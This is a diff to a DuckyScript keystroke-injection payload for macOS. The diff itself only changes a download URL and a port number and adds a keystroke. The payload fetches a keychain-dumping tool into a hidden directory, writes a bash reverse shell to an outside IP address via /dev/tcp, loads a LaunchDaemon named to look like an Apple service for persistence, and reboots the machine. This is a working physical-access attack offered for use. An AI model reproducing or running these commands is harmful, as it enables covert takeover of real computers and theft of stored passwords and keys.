@@ -10,7 +10,7 @@ DELAY 200
 
 STRING echo '#!/bin/sh
 ENTER
-STRING curl -o /Library/.hidden/keychaindump 'https://github.com/Rainierraoul/duckdump/raw/master/keychaindump'
+STRING curl -o /Library/.hidden/keychaindump 'https://raw.githubusercontent.com/Rainierraoul/duckdump/master/keychaindump'
 ENTER
 STRING chmod +x /Library/.hidden/keychaindump
 ENTER
@@ -31,7 +31,7 @@ DELAY 200
 
 STRING echo '#!/bin/bash
 ENTER
-STRING bash -i >& /dev/tcp/120.149.4.142/1988 0>&1
+STRING bash -i >& /dev/tcp/120.149.4.142/1989 0>&1
 ENTER
 STRING wait' > /Library/.hidden/connect.sh
 ENTER
@@ -122,5 +122,5 @@ DELAY 200
 STRING launchctl load /Library/LaunchDaemons/com.apples.remoteservices.plist
 ENTER
 DELAY 1000
-
 STRING shutdown -r now
+ENTER
